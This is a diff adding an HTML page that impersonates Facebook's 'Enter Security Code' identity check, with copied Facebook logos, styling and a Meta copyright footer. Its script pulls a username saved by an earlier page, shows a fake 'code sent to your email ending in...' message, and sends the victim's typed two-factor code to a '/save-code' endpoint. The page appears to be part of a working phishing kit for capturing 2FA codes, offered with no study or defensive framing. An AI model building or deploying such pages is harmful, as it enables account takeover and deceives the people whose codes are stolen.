@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Facebook – Confirm Your Identity</title>
+  <style>
+    body {
+      background-color: #f0f2f5;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .confirmation-container {
+      background: white;
+      max-width: 400px;
+      width: 90%;
+      padding: 30px 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .fb-logo {
+      margin-bottom: 20px;
+    }
+    .fb-logo img {
+      height: 40px;
+    }
+    h2 {
+      color: #1c1e21;
+      font-size: 20px;
+      margin-bottom: 10px;
+    }
+    p {
+      color: #606770;
+      font-size: 14px;
+      margin-bottom: 25px;
+      line-height: 1.4;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
+    }
+    .btn {
+      width: 100%;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-bottom: 15px;
+    }
+    .resend-link {
+      font-size: 13px;
+      color: #1877f2;
+      cursor: pointer;
+    }
+    .resend-link:hover {
+      text-decoration: underline;
+    }
+    .meta-footer {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      background-color: white;
+      padding: 10px 20px;
+      box-shadow: 0 -2px 5px rgba(0,0,0,0.1);
+      text-align: center;
+    }
+    .top-line {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .top-line img {
+      height: 24px;
+    }
+    .meta-text {
+      font-weight: bold;
+      font-size: 1.1rem;
+      color: #333;
+    }
+    .bottom-line {
+      font-size: 0.9rem;
+      color: #555;
+    }
+  </style>
+</head>
+<body>
+  <div class="confirmation-container">
+    <div class="fb-logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" />
+    </div>
+    <h2>Enter Security Code</h2>
+    <p id="confirmation-msg"></p>
+
+    <input type="text" id="code-input" placeholder="Enter code" maxlength="20" />
+    <button class="btn" onclick="verifyCode()">Continue</button>
+    <div class="resend-link" onclick="alert('A new code has been sent.')">Didn't get the code?</div>
+  </div>
+
+  <div class="meta-footer">
+    <div class="top-line">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Meta logo" />
+      <div class="meta-text">Meta</div>
+    </div>
+    <div class="bottom-line">&copy; 2025 Meta Platforms, Inc.</div>
+  </div>
+
+  <script>
+    window.onload = function () {
+      const user = localStorage.getItem("login_user");
+      const msgEl = document.getElementById("confirmation-msg");
+
+      if (!user) {
+        msgEl.textContent = "To confirm it's really you trying to log in, we sent a code to your account. Enter it below to continue.";
+        return;
+      }
+
+      let displayType = "account";
+      let ending = "";
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (emailRegex.test(user)) {
+        displayType = "email";
+        const atIndex = user.indexOf("@");
+        ending = user.slice(atIndex);
+      } else if (/^\d{7,}$/.test(user)) {
+        displayType = "phone number";
+        ending = user.slice(-4);
+      } else {
+        displayType = "username";
+        ending = user.length > 4 ? user.slice(-4) : user;
+      }
+
+      msgEl.textContent = `To confirm it's really you trying to log in, we sent a code to your ${displayType} ending in ....${ending}. Enter it below to continue.`;
+    };
+
+    function verifyCode() {
+      const codeInput = document.getElementById("code-input");
+      const code = codeInput.value.trim();
+
+      // Remove previous error state
+      const existingError = document.querySelector(".error-message");
+      if (existingError) existingError.remove();
+      codeInput.style.borderColor = "#ccc";
+
+      if (!code) {
+        codeInput.style.borderColor = "red";
+
+        const error = document.createElement("div");
+        error.className = "error-message";
+        error.textContent = "Required";
+        error.style.color = "red";
+        error.style.fontSize = "12px";
+        error.style.marginTop = "-15px";
+        error.style.marginBottom = "15px";
+        codeInput.parentNode.insertBefore(error, codeInput.nextSibling);
+
+        return;
+      }
+
+      // Submit code
+      fetch('/save-code', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ code })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.success) {
+          window.location.href = "homepage.html";
+        } else {
+          alert("Incorrect code. Please try again.");
+        }
+      })
+      .catch(() => {
+        alert("An error occurred. Please try again.");
+      });
+    }
+
+  </script>
+</body>
+</html>
